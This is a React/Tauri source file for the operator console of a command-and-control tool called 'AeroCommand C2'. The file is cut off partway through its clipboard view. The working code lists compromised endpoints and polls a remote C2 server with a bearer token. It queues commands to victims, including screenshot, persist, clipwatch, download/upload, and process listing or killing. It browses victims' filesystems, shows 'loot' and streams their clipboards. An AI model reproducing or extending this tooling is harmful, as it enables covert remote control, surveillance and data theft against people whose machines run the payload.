import React, { useState, useEffect, useRef } from 'react';
import {
  LayoutDashboard, Monitor, Terminal as TerminalIcon, FolderOpen,
  Clipboard, Database, Settings, RefreshCw, Cpu, HardDrive,
  Search, Copy,
  FileText, FileCode, Archive, File as FileGeneric,
  Image as ImageIcon
} from 'lucide-react';
import { invoke } from '@tauri-apps/api/core';

import Dashboard from './components/Dashboard';
import TerminalView from './components/Terminal';
import FileExplorer from './components/FileExplorer';
import PreviewModal from './components/PreviewModal';
import Tooltip from './components/Tooltip';
import type { Client, CommandLog, FileEntry, LootFile, ProcessEntry, PreviewData } from './types';


// ==================== APP ====================

export default function App() {

  // ---- UI State ----
  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
  const [serverPort] = useState('9540');
  const [c2ServerUrl, setC2ServerUrl] = useState<string>(() => localStorage.getItem('c2_server_url') || 'https://your-c2-service.onrender.com');
  const [c2OperatorToken, setC2OperatorToken] = useState<string>(() => localStorage.getItem('c2_operator_token') || '');
  const [c2Mode, setC2Mode] = useState<'cloud' | 'local'>(() => (localStorage.getItem('c2_mode') as any) || 'cloud');
  const [c2ConnectionStatus, setC2ConnectionStatus] = useState<'connected' | 'connecting' | 'error'>('connecting');
  const authHeader = { 'Authorization': `Bearer ${c2OperatorToken}` };

  // ---- Client / Log State ----
  const [clients, setClients] = useState<Client[]>([]);
  const [logs, setLogs] = useState<CommandLog[]>([]);
  const [selectedClientId, setSelectedClientId] = useState<string>('');

  // ---- File Explorer State ----
  const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
  const [currentPath, setCurrentPath] = useState<string>('');
  const [fileList, setFileList] = useState<FileEntry[]>([]);
  const [isFilesLoading, setIsFilesLoading] = useState(false);
  const [fileError, setFileError] = useState<string>('');
  const [fileTruncated, setFileTruncated] = useState(false);
  const [fileTotalCount, setFileTotalCount] = useState(0);
  const navHistoryRef = useRef<string[]>([]);
  const browsingIndicatorRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const dirCacheRef = useRef<Map<string, { items: FileEntry[], truncated: boolean, count: number }>>(new Map());

  // ---- Preview State ----
  const [previewOpen, setPreviewOpen] = useState(false);
  const [previewData, setPreviewData] = useState<PreviewData | null>(null);
  const [isPreviewLoading, setIsPreviewLoading] = useState(false);
  const [previewZoom, setPreviewZoom] = useState(1);
  const [copiedPath, setCopiedPath] = useState(false);

  // ---- Loot State ----
  const [lootFiles] = useState<LootFile[]>([]);
  const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
  const [lootContent, setLootContent] = useState<string | null>(null);

  // ---- Process State ----
  const [processList, setProcessList] = useState<ProcessEntry[]>([]);
  const [isProcessesLoading, setIsProcessesLoading] = useState(false);
  const [processSearch, setProcessSearch] = useState('');

  // ---- Toast ----
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  // ---- Terminal State ----
  const [termInput, setTermInput] = useState('');
  const [termLogs, setTermLogs] = useState<string[]>([
    'Welcome to AeroCommand C2 — Interactive Shell',
    'Use the command input below to interact with connected endpoints.',
    'Tip: Press Enter to execute. Commands are queued and results appear here.',
  ]);
  const [suggestions, setSuggestions] = useState<string[]>([]);

  const logsRef = useRef<CommandLog[]>([]);
  const printedIdsRef = useRef<Set<number>>(new Set());

  // ==================== DATA POLLING ====================

  useEffect(() => {
    const pollInterval = (activeTab === 'files' && isFilesLoading) ? 1000 : 2000;

    const fetchData = async () => {
      try {
        let backendClients: Client[] = [];
        let backendLogs: CommandLog[] = [];

        if (c2Mode === 'cloud' && c2ServerUrl) {
          const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
          try {
            const clientsRes = await fetch(`${cleanUrl}/api/clients`, { headers: authHeader });
            if (clientsRes.ok) {
              backendClients = await clientsRes.json();
              setC2ConnectionStatus('connected');
            }
          } catch (e) {
            setC2ConnectionStatus('error');
          }

          try {
            const logsRes = await fetch(`${cleanUrl}/api/logs`, { headers: authHeader });
            if (logsRes.ok) {
              backendLogs = await logsRes.json();
            }
          } catch (e) {}
        } else {
          try {
            backendClients = await invoke<Client[]>('get_clients');
            backendLogs = await invoke<CommandLog[]>('get_logs');
          } catch (_) {}
        }

        setClients(backendClients);
        setLogs(backendLogs);
        logsRef.current = backendLogs;

        // Inject JSON previews into logs
        backendLogs.forEach((log) => {
          if (printedIdsRef.current.has(log.id)) return;
          if (log.output.includes('[JSON_PREVIEW]')) {
            printedIdsRef.current.add(log.id);
            try {
              const jsonStr = log.output.replace('[JSON_PREVIEW]', '');
              const parsed = JSON.parse(jsonStr);
              if (parsed.status === 'ok' && parsed.type === 'image') {
                setPreviewOpen(true);
                setPreviewData(parsed);
              }
            } catch (_) {}
          } else if (log.output.includes('[JSON_PROCS]')) {
            printedIdsRef.current.add(log.id);
            try {
              const jsonStr = log.output.replace('[JSON_PROCS]', '');
              const procs = JSON.parse(jsonStr);
              setProcessList(procs);
              setIsProcessesLoading(false);
            } catch (_) {}
          } else if (log.output.includes('[JSON_FILES]')) {
            parseFileList(log.output);
          }
        });

        // Trim terminal log to avoid memory bloat
        setTermLogs(prev => prev.length > 200 ? prev.slice(-200) : prev);
      } catch (_) {}
    };

    fetchData();
    const interval = setInterval(fetchData, pollInterval);
    return () => clearInterval(interval);
  }, [activeTab, isFilesLoading, c2Mode, c2ServerUrl]);

  // ==================== FILE EXPLORER LOGIC ====================

  function normPath(path: string) {
    return path.replace(/\\/g, '/').replace(/\/+/g, '/').replace(/\/$/, '');
  }

  const parseFileList = (output: string) => {
    try {
      const data = JSON.parse(output.replace('[JSON_FILES]', ''));
      setFileList(data.files || []);
      setFileTruncated(data.truncated || false);
      setFileTotalCount(data.count || data.files?.length || 0);
      setFileError('');
    } catch (e) {
      const lines = output.split('\n');
      const items: FileEntry[] = [];
      lines.forEach(line => {
        if (!line.trim()) return;
        const isDir = line.includes('DIR') || line.includes('DRIVE');
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 4) {
          items.push({
            name: parts[parts.length - 1],
            size: isDir ? '--' : parts.slice(3, -1).join(' ') || '--',
            date: parts.slice(0, 3).join(' '),
            is_dir: isDir,
          });
        }
      });
      setFileList(items);
    }
  };

  const listDrives = () => {
    executeCommand('ls -a .', true);
    setCurrentPath('System Drives');
    navHistoryRef.current = [];
  };

  const browseFolder = (path: string, forceRefresh = false) => {
    if (browsingIndicatorRef.current) {
      clearTimeout(browsingIndicatorRef.current);
    }

    const normalized = normPath(path);
    const cacheKey = normalized;

    if (!forceRefresh && dirCacheRef.current.has(cacheKey)) {
      const cached = dirCacheRef.current.get(cacheKey)!;
      setFileList(cached.items);
      setFileTruncated(cached.truncated);
      setFileTotalCount(cached.count);
      setFileError('');
      setCurrentPath(normalized);
      if (!navHistoryRef.current.includes(normalized)) {
        navHistoryRef.current.push(currentPath);
      }
      return;
    }

    setIsFilesLoading(true);
    setFileError('');

    // Push current path to history before navigating
    if (currentPath && normalized !== currentPath) {
      navHistoryRef.current.push(currentPath);
    }
    setCurrentPath(normalized);

    executeCommand(`ls "${path}"`, true);

    browsingIndicatorRef.current = setTimeout(() => {
      setIsFilesLoading(false);
    }, 3000);
  };

  const goBack = () => {
    const history = navHistoryRef.current;
    if (history.length === 0) return;
    const prevPath = history.pop()!;
    const cached = dirCacheRef.current.get(normPath(prevPath));
    if (cached) {
      setFileList(cached.items);
      setFileTruncated(cached.truncated);
      setFileTotalCount(cached.count);
      setFileError('');
    } else {
      browseFolder(prevPath, true);
    }
    setCurrentPath(prevPath);
  };

  const renderBreadcrumbs = () => {
    if (!currentPath || currentPath === 'System Drives') return null;
    const parts = currentPath.split('/').filter(Boolean);
    return (
      <div className="flex items-center space-x-1 text-[10px] font-mono text-slate-400 mt-0.5">
        {parts.map((part, i) => (
          <React.Fragment key={i}>
            {i > 0 && <span className="text-slate-600">/</span>}
            <span className="hover:text-c2accent cursor-pointer transition-colors">{part}</span>
          </React.Fragment>
        ))}
      </div>
    );
  };

  const getFileMeta = (file: FileEntry) => {
    const ext = file.name.split('.').pop()?.toLowerCase() || '';
    const imageExts = ['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'ico'];
    const textExts = ['txt', 'log', 'json', 'xml', 'yaml', 'yml', 'md', 'ini', 'cfg', 'conf', 'bat', 'ps1', 'sh', 'py', 'js', 'ts', 'html', 'css', 'csv'];
    const codeExts = ['py', 'js', 'ts', 'jsx', 'tsx', 'c', 'cpp', 'h', 'hpp', 'cs', 'java', 'go', 'rs', 'rb', 'php', 'pl'];
    const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];

    let icon = <FileGeneric className="w-3.5 h-3.5 text-slate-400" />;
    let isPreviewable = false;

    if (file.is_dir) {
      icon = <FolderOpen className="w-3.5 h-3.5 text-amber-400" />;
    } else if (imageExts.includes(ext)) {
      icon = <ImageIcon className="w-3.5 h-3.5 text-emerald-400" />;
      isPreviewable = true;
    } else if (textExts.includes(ext)) {
      icon = <FileText className="w-3.5 h-3.5 text-blue-400" />;
      isPreviewable = true;
    } else if (codeExts.includes(ext)) {
      icon = <FileCode className="w-3.5 h-3.5 text-violet-400" />;
      isPreviewable = true;
    } else if (archiveExts.includes(ext)) {
      icon = <Archive className="w-3.5 h-3.5 text-orange-400" />;
    }

    return { icon, isPreviewable };
  };

  const requestPreview = async (filePath: string, _fileName: string) => {
    setPreviewOpen(true);
    setPreviewData(null);
    setIsPreviewLoading(true);

    try {
      const result = await invoke<PreviewData>('preview_file', { path: filePath });
      setPreviewData(result);
    } catch (e) {
      setPreviewData({ status: 'error', message: String(e) });
    } finally {
      setIsPreviewLoading(false);
    }
  };

  const handleKeyDown = (e: KeyboardEvent) => {
    if (e.key === 'Escape') {
      setPreviewOpen(false);
    }
  };

  useEffect(() => {
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // ==================== ACTIVITY LOG FORMATTER ====================

  const formatActivityLog = (log: CommandLog) => {
    const cmd = log.command || '';
    let category = 'commands';
    let badge = cmd.toUpperCase() || 'OUTPUT';
    let badgeClass = 'bg-blue-500/10 text-blue-400 border-blue-500/20';
    let title = cmd || 'Command Output';
    let detail = log.output.split('\n')[0] || '';
    let icon = <HardDrive className="w-3 h-3" />;
    let meta: string | undefined;

    if (cmd.startsWith('ls') || cmd.startsWith('cd') || cmd === 'download') {
      category = 'files';
      badge = 'FILES';
      badgeClass = 'bg-amber-500/10 text-amber-400 border-amber-500/20';
      icon = <FolderOpen className="w-3 h-3" />;
    } else if (cmd === 'ps' || cmd === 'killproc') {
      category = 'processes';
      badge = cmd === 'ps' ? 'PROCS' : 'KILL';
      badgeClass = 'bg-violet-500/10 text-violet-400 border-violet-500/20';
      icon = <Cpu className="w-3 h-3" />;
    } else if (cmd.startsWith('clip')) {
      category = 'clipboard';
      badge = 'CLIP';
      badgeClass = 'bg-rose-500/10 text-rose-400 border-rose-500/20';
      icon = <Clipboard className="w-3 h-3" />;
    }

    if (log.output.includes('[JSON_FILES]')) {
      try {
        const data = JSON.parse(log.output.replace('[JSON_FILES]', ''));
        detail = `${data.files?.length || 0} items`;
        if (data.truncated) meta = `${data.count} total`;
      } catch (_) {}
    } else if (log.output.includes('[JSON_PREVIEW]')) {
      try {
        const data = JSON.parse(log.output.replace('[JSON_PREVIEW]', ''));
        detail = data.name || log.output.split('\n')[0];
      } catch (_) {}
    } else if (log.output.includes('[JSON_PROCS]')) {
      try {
        const data = JSON.parse(log.output.replace('[JSON_PROCS]', ''));
        const count = Array.isArray(data) ? data.length : 0;
        detail = `${count} process${count !== 1 ? 'es' : ''}`;
      } catch (_) {}
    } else if (log.output.startsWith('[JSON_SCREENSHOT]')) {
      category = 'files';
      badge = 'SCREEN';
      badgeClass = 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20';
      detail = 'Screenshot captured';
      icon = <Monitor className="w-3 h-3" />;
    }

    if (detail.length > 55) detail = detail.slice(0, 55) + '...';

    return { category, badge, badgeClass, title, detail, icon, meta };
  };

  // ==================== PROCESS HANDLERS ====================

  const fetchProcesses = (silent: boolean = true) => {
    setIsProcessesLoading(true);
    executeCommand('ps', silent);
  };

  const killProcess = (pidOrName: string) => {
    executeCommand(`killproc ${pidOrName}`, false);
  };

  // ==================== LOOT ====================

  const viewLoot = async (file: LootFile) => {
    setSelectedLoot(file);
    setLootContent(null);
    try {
      const content = await invoke<string>('get_loot_file', { path: file.path });
      setLootContent(content);
    } catch (e) {
      setLootContent(null);
    }
  };

  // ==================== TERMINAL ====================

  const handleInputChange = (val: string) => {
    setTermInput(val);
    if (val.trim()) {
      const cmds = ['sysinfo', 'screenshot', 'ps', 'clip', 'clipwatch', 'clipstop', 'persist', 'kill', 'killproc', 'ls', 'cd', 'download', 'upload', 'clear', 'help'];
      const filtered = cmds.filter(c => c.startsWith(val.toLowerCase()));
      setSuggestions(filtered);
    } else {
      setSuggestions([]);
    }
  };

  const executeCommand = async (cmd: string, silent: boolean = false) => {
    if (!cmd.trim()) return;

    const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
      ? selectedClientId
      : (clients[0]?.id || '');
    if (!silent) {
      setTermLogs(prev => [...prev, `> ${cmd}`]);
    }

    try {
      if (c2Mode === 'cloud' && c2ServerUrl) {
        const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
        const res = await fetch(`${cleanUrl}/api/send_command`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', ...authHeader },
          body: JSON.stringify({ client_id: targetId, command: cmd }),
        });
        if (res.ok) {
          if (!silent) {
            setTermLogs(prev => [...prev, `[+] Command queued via Cloud C2 for ${targetId}`]);
          }
        } else {
          if (!silent) {
            setTermLogs(prev => [...prev, `[-] Cloud C2 error: ${res.statusText}`]);
          }
        }
      } else {
        await invoke('send_command', { clientId: targetId, command: cmd });
        if (!silent) {
          setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
        }
      }
    } catch (err) {
      if (!silent) {
        setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
      }
    }

    setTermInput('');
    setSuggestions([]);
  };

  const onRefreshClients = () => {
    (async () => {
      if (c2Mode === 'cloud' && c2ServerUrl) {
        const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
        const res = await fetch(`${cleanUrl}/api/clients`, { headers: authHeader });
        if (res.ok) setClients(await res.json());
      } else {
        setClients(await invoke<Client[]>('get_clients'));
      }
    })();
  };

  // ==================== JSX ====================

  return (
    <div className="flex h-screen w-screen bg-c2bg text-slate-100 overflow-hidden font-sans select-none antialiased">

      {/* ==================== SIDEBAR ==================== */}
      <div className="w-60 bg-c2sidebar border-r border-c2border flex flex-col justify-between p-3 shrink-0">
        <div>
          {/* Windows-style Header */}
          <div className="flex items-center space-x-2.5 px-2 py-3 mb-2 border-b border-c2border/60">
            <div className="w-8 h-8 rounded-lg overflow-hidden flex items-center justify-center shrink-0">
              <img src="/logo.png" alt="AeroCommand Logo" className="w-full h-full object-contain" />
            </div>
            <div>
              <span className="font-bold text-sm text-white tracking-tight block">AeroCommand</span>
              <span className="text-[10px] text-slate-400 font-semibold block uppercase tracking-wider">C2 Console v3.5</span>
            </div>
          </div>

          {/* Main Navigation Menu */}
          <div className="space-y-0.5 mt-2">
            <div className="text-[10px] uppercase font-bold text-slate-500 tracking-wider px-2.5 py-1">Navigation</div>
            {[
              { id: 'dashboard', label: 'Dashboard', icon: LayoutDashboard, tip: 'Fleet overview and live telemetry' },
              { id: 'endpoints', label: 'Endpoints', icon: Monitor, tip: 'Manage connected remote endpoints' },
              { id: 'terminal', label: 'Command Center', icon: TerminalIcon, tip: 'Interactive command shell' },
              { id: 'processes', label: 'Process Manager', icon: Cpu, tip: 'Process telemetry & termination' },
              { id: 'files', label: 'File & Loot', icon: FolderOpen, tip: 'Remote filesystem & live preview' },
              { id: 'clipboard', label: 'Clipboard Stream', icon: Clipboard, tip: 'Live clipboard monitor' },
              { id: 'database', label: 'History & Logs', icon: Database, tip: 'Historical command executions' },
              { id: 'settings', label: 'Server Config', icon: Settings, tip: 'C2 network & server parameters' },
            ].map((item) => {
              const Icon = item.icon;
              const isActive = activeTab === item.id;
              return (
                <Tooltip key={item.id} text={item.tip} position="right">
                  <button
                    onClick={() => setActiveTab(item.id as any)}
                    className={`w-full flex items-center space-x-2.5 px-2.5 py-2 rounded-md text-xs font-medium transition-colors ${
                      isActive
                        ? 'bg-c2accent text-white font-semibold shadow-sm'
                        : 'text-slate-300 hover:bg-c2card hover:text-white'
                    }`}
                  >
                    <Icon className={`w-4 h-4 ${isActive ? 'text-white' : 'text-slate-400'}`} />
                    <span>{item.label}</span>
                  </button>
                </Tooltip>
              );
            })}
          </div>
        </div>

        {/* Footer Listener Status */}
        <div className="p-2.5 bg-c2card border border-c2border rounded-lg">
          <div className="flex items-center justify-between text-xs text-slate-300 mb-1">
            <span className="text-[11px] font-semibold">C2 Network</span>
            <span className={`flex items-center text-[10px] font-bold ${
              c2ConnectionStatus === 'connected' ? 'text-emerald-400' : 'text-amber-400'
            }`}>
              <span className={`h-1.5 w-1.5 rounded-full mr-1.5 ${
                c2ConnectionStatus === 'connected' ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'
              }`}></span>
              {c2Mode === 'cloud' ? 'RENDER CLOUD' : 'LOCAL'}
            </span>
          </div>
          <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between mt-1">
            <span className="truncate max-w-[110px]" title={c2Mode === 'cloud' ? c2ServerUrl : `Port ${serverPort}`}>
              {c2Mode === 'cloud' ? 'onrender.com' : `Port ${serverPort}`}
            </span>
            <span className="text-c2cyan font-bold">{clients.length} Client{clients.length === 1 ? '' : 's'}</span>
          </div>
        </div>
      </div>

      {/* ==================== MAIN WORKSPACE ==================== */}
      <div className="flex-1 flex flex-col overflow-hidden bg-c2bg">

        {/* WINDOWS TOOLBAR */}
        <header className="h-12 px-5 flex items-center justify-between border-b border-c2border bg-c2sidebar/60 shrink-0">
          {/* View Switcher Segmented Control */}
          <div className="flex items-center space-x-1 bg-c2card border border-c2border rounded-md p-0.5">
            {[
              { label: 'Overview', tab: 'dashboard' },
              { label: 'Endpoints', tab: 'endpoints' },
              { label: 'Files', tab: 'files' },
              { label: 'Terminal', tab: 'terminal' },
            ].map((pill) => (
              <button
                key={pill.tab}
                onClick={() => setActiveTab(pill.tab as any)}
                className={`px-3 py-1 rounded text-xs font-medium transition-colors ${
                  activeTab === pill.tab
                    ? 'bg-c2accent text-white font-semibold shadow-sm'
                    : 'text-slate-300 hover:text-white'
                }`}
              >
                {pill.label}
              </button>
            ))}
          </div>

          {/* Center Search / Command Box */}
          <div className="flex items-center space-x-2 bg-c2pill border border-c2border rounded-md px-3 py-1.5 w-72 text-xs text-slate-300">
            <Search className="w-3.5 h-3.5 text-slate-400 shrink-0" />
            <input
              type="text"
              placeholder="Search endpoints or run command..."
              value={termInput}
              onChange={(e) => handleInputChange(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter') {
                  executeCommand(termInput);
                  setActiveTab('terminal');
                }
              }}
              className="bg-transparent text-xs text-white placeholder:text-slate-500 outline-none w-full font-sans"
            />
          </div>

          {/* Right Actions */}
          <div className="flex items-center space-x-2">
            {clients.length > 1 ? (
              <select
                value={selectedClientId}
                onChange={(e) => setSelectedClientId(e.target.value)}
                className="bg-c2card border border-c2border text-xs text-slate-300 rounded px-2 py-1.5 outline-none focus:border-c2accent"
              >
                {clients.map(c => (
                  <option key={c.id} value={c.id}>{c.host} ({c.ip})</option>
                ))}
              </select>
            ) : null}
            <button
              onClick={() => setActiveTab('settings')}
              className="p-2 hover:bg-c2card rounded text-slate-400 hover:text-white transition-colors"
              title="Settings"
            >
              <Settings className="w-4 h-4" />
            </button>
          </div>
        </header>

        {/* SCROLLABLE CONTENT */}
        <div className="flex-1 overflow-y-auto p-6">

          {/* 1. DASHBOARD */}
          {activeTab === 'dashboard' && (
            <Dashboard
              clients={clients}
              logs={logs}
              selectedClientId={selectedClientId}
              setSelectedClientId={setSelectedClientId}
              setActiveTab={setActiveTab}
              formatActivityLog={formatActivityLog}
              executeCommand={executeCommand}
              onRefreshClients={onRefreshClients}
            />
          )}

          {/* 2. ENDPOINTS */}
          {activeTab === 'endpoints' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-sm font-bold text-white uppercase tracking-wider">Fleet Management</h2>
                  <p className="text-[11px] text-slate-400">Select an active machine to target commands & explore filesystem</p>
                </div>
                <button
                  onClick={onRefreshClients}
                  className="px-2.5 py-1 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors"
                >
                  <RefreshCw className="w-3 h-3" />
                  <span>Refresh Fleet</span>
                </button>
              </div>

              <div className="bg-c2card border border-c2border rounded-xl shadow-card overflow-hidden">
                {clients.length === 0 ? (
                  <div className="p-12 text-center flex flex-col items-center justify-center space-y-3">
                    <Monitor className="w-10 h-10 text-slate-600" />
                    <h3 className="text-sm font-bold text-slate-200">No active endpoints connected</h3>
                    <p className="text-xs text-slate-500">Endpoints will appear here automatically when the payload runs on target.</p>
                  </div>
                ) : (
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="border-b border-c2border bg-slate-900/60 text-[10px] uppercase font-bold text-slate-400 tracking-wider">
                        <th className="p-3.5">Endpoint Host / User</th>
                        <th className="p-3.5">IP Address</th>
                        <th className="p-3.5">PID</th>
                        <th className="p-3.5">Operating System</th>
                        <th className="p-3.5">Status</th>
                        <th className="p-3.5 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-c2border text-xs">
                      {clients.map((c, i) => {
                        const isTarget = selectedClientId ? selectedClientId === c.id : i === 0;
                        return (
                          <tr
                            key={c.id}
                            onClick={() => setSelectedClientId(c.id)}
                            className={`transition-colors cursor-pointer ${isTarget ? 'bg-[#1A2235]' : 'hover:bg-c2pill/50'}`}
                          >
                            <td className="p-3.5">
                              <div className="flex items-center space-x-2.5">
                                <div className={`p-1.5 rounded-md border ${isTarget ? 'bg-c2accent text-white border-c2accent' : 'bg-c2bg text-slate-400 border-c2border'}`}>
                                  <Monitor className="w-3.5 h-3.5" />
                                </div>
                                <div>
                                  <div className="flex items-center space-x-2">
                                    <span className="font-bold text-white text-xs">{c.host}</span>
                                    <span className="text-[11px] text-slate-400">({c.user})</span>
                                    {isTarget && (
                                      <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-c2accent text-white">TARGET</span>
                                    )}
                                  </div>
                                  <div className="text-[10px] text-slate-500 font-mono">ID: {c.id}</div>
                                </div>
                              </div>
                            </td>
                            <td className="p-3.5 font-mono text-slate-200 font-medium">{c.ip}</td>
                            <td className="p-3.5 font-mono text-slate-400">{c.pid}</td>
                            <td className="p-3.5 text-slate-300 font-mono text-[11px]">{c.os}</td>
                            <td className="p-3.5">
                              <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-semibold rounded">
                                {c.status || 'ONLINE'}
                              </span>
                            </td>
                            <td className="p-3.5 text-right">
                              <div className="flex items-center justify-end space-x-1.5">
                                <button
                                  onClick={(e) => { e.stopPropagation(); setSelectedClientId(c.id); setActiveTab('terminal'); }}
                                  className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-c2cyan rounded-md transition-colors"
                                >
                                  Shell
                                </button>
                                <button
                                  onClick={(e) => { e.stopPropagation(); setSelectedClientId(c.id); setActiveTab('files'); }}
                                  className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-amber-400 rounded-md transition-colors"
                                >
                                  Files
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                )}
              </div>
            </div>
          )}

          {/* 3. TERMINAL */}
          {activeTab === 'terminal' && (
            <TerminalView
              clients={clients}
              termLogs={termLogs}
              termInput={termInput}
              setTermInput={setTermInput}
              suggestions={suggestions}
              setSuggestions={setSuggestions}
              executeCommand={executeCommand}
              handleInputChange={handleInputChange}
            />
          )}

          {/* 4. FILES */}
          {activeTab === 'files' && (
            <FileExplorer
              fileSubTab={fileSubTab}
              setFileSubTab={setFileSubTab}
              currentPath={currentPath}
              fileList={fileList}
              isFilesLoading={isFilesLoading}
              fileError={fileError}
              fileTruncated={fileTruncated}
              fileTotalCount={fileTotalCount}
              navHistoryRef={navHistoryRef}
              browseFolder={browseFolder}
              goBack={goBack}
              listDrives={listDrives}
              renderBreadcrumbs={renderBreadcrumbs}
              getFileMeta={getFileMeta}
              requestPreview={requestPreview}
              executeCommand={executeCommand}
              lootFiles={lootFiles}
              selectedLoot={selectedLoot}
              lootContent={lootContent}
              viewLoot={viewLoot}
            />
          )}

          {/* 5. PROCESS MANAGER */}
          {activeTab === 'processes' && (
            <div className="h-full flex flex-col space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <h2 className="text-lg font-bold">Process Manager</h2>
                  <span className="text-[10px] bg-slate-800 text-slate-400 px-2 py-0.5 rounded border border-c2border/50 uppercase tracking-widest">
                    {processList.length} Processes
                  </span>
                </div>
                <div className="flex items-center space-x-2">
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
                    <input
                      type="text"
                      placeholder="Search processes..."
                      value={processSearch}
                      onChange={(e) => setProcessSearch(e.target.value)}
                      className="bg-slate-900 border border-c2border rounded-full pl-9 pr-4 py-1.5 text-xs w-64 focus:outline-none focus:border-c2accent/50 transition-colors"
                    />
                  </div>
                  <button
                    onClick={() => fetchProcesses()}
                    disabled={isProcessesLoading}
                    className="flex items-center space-x-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-bold transition-colors border border-c2border disabled:opacity-50"
                  >
                    <RefreshCw className={`w-3 h-3 ${isProcessesLoading ? 'animate-spin' : ''}`} />
                    <span>REFRESH</span>
                  </button>
                </div>
              </div>

              <div className="flex-1 bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
                <div className="overflow-y-auto flex-1">
                  <table className="w-full text-left border-collapse">
                    <thead className="sticky top-0 z-10">
                      <tr className="border-b border-c2border bg-slate-900 text-xs text-slate-400">
                        <th className="p-3 font-bold uppercase tracking-wider">Process Name</th>
                        <th className="p-3 font-bold uppercase tracking-wider">PID</th>
                        <th className="p-3 font-bold uppercase tracking-wider">Memory</th>
                        <th className="p-3 font-bold uppercase tracking-wider">User</th>
                        <th className="p-3 font-bold uppercase tracking-wider">Window Title</th>
                        <th className="p-3 font-bold uppercase tracking-wider text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-c2border text-[11px] font-mono">
                      {isProcessesLoading && processList.length === 0 ? (
                        <tr>
                          <td colSpan={6} className="p-12 text-center text-slate-500">
                            <div className="flex flex-col items-center space-y-3">
                              <RefreshCw className="w-8 h-8 animate-spin opacity-20" />
                              <span className="text-[10px] font-bold uppercase tracking-[0.2em]">Gathering process list...</span>
                            </div>
                          </td>
                        </tr>
                      ) : (
                        processList
                          .filter(p =>
                            p.name.toLowerCase().includes(processSearch.toLowerCase()) ||
                            p.pid.includes(processSearch) ||
                            p.title.toLowerCase().includes(processSearch.toLowerCase())
                          )
                          .map((p, i) => (
                            <tr key={i} className="hover:bg-slate-800/30 group transition-colors">
                              <td className="p-3 text-slate-200 font-bold flex items-center space-x-2">
                                <Cpu className="w-3 h-3 text-c2accent opacity-50" />
                                <span>{p.name}</span>
                              </td>
                              <td className="p-3 text-slate-400">{p.pid}</td>
                              <td className="p-3 text-emerald-400/70">{p.mem}</td>
                              <td className="p-3 text-slate-500 truncate max-w-[120px]">{p.user}</td>
                              <td className="p-3 text-slate-400 italic truncate max-w-[200px]">{p.title || '-'}</td>
                              <td className="p-3 text-right">
                                <button
                                  onClick={() => killProcess(p.pid)}
                                  className="px-2 py-1 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white rounded text-[9px] font-bold transition-all border border-red-500/20 opacity-0 group-hover:opacity-100"
                                >
                                  KILL
                                </button>
                              </td>
                            </tr>
                          ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* 6. CLIPBOARD */}
          {activeTab === 'clipboard' && (() => {
            const clipEntries = logs
              .filter(l => l.status === 'SUCCESS' && (l.command === 'clip' || l.command === 'clipwatch' || l.command.startsWith('clip')))
              .filter(l => !l.output.startsWith('[JSON_') && l.output.trim().length > 0)
              .map(l => ({
                id: l.id,
                client: l.client_id,
                content: l.output.trim(),
                timestamp: l.timestamp,
              }))
              .reverse();

            const isWatching = logs.some(l => l.command === 'clipwatch' && l.status === 'SUCCESS') &&
              !logs.some(l => l.command === 'clipstop' && l.status === 'SUCCESS');

            return (
              <div className="h-full flex flex-col space-y-3">
                <div className="flex items-center justify-between">
                  <div>
                    <h2 className="text-sm font-bold text-white uppercase tracking-wider">Clipboard Stream</h2>
                    <p className="text-[11px] text-slate-400 mt-0.5">Live clipboard monitoring from remote endpoints</p>
                  </div>
                  <div className="flex items-center space-x-2">
                    <button
                      onClick={() => executeCommand('clip')}
                      disabled={clients.length === 0}
                      className="px-3 py-1.5 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                    >
                      <Clipboard className="w-3 h-3" />
                      <span>Grab Once</span>
                    </button>
                    <button
